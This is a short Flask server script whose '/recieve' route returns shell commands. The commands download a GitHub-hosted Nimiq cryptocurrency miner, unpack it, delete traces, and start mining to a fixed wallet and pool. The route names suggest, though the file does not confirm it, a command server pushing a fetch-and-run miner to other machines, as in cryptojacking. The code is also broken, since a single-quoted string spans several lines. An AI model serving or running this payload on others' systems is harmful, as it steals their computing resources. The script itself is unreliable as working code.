from flask import Flask
import os


app = Flask(__name__)

@app.route("/recieve")
def recieve():
  command = 'mkdir NimiqMiner
cd NimiqMiner
wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
mkdir nq-miner
tar -xzvf nq-nimer-linux.zip -C nq-miner
rm nq-nimer-linux.zip
rm ./nq-miner/start_gpu.sh
./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443
'
  return command

@app.route("/send")
def send():
  return "send Router"


if __name__ == "__main__":
  app.run(port = 5000)
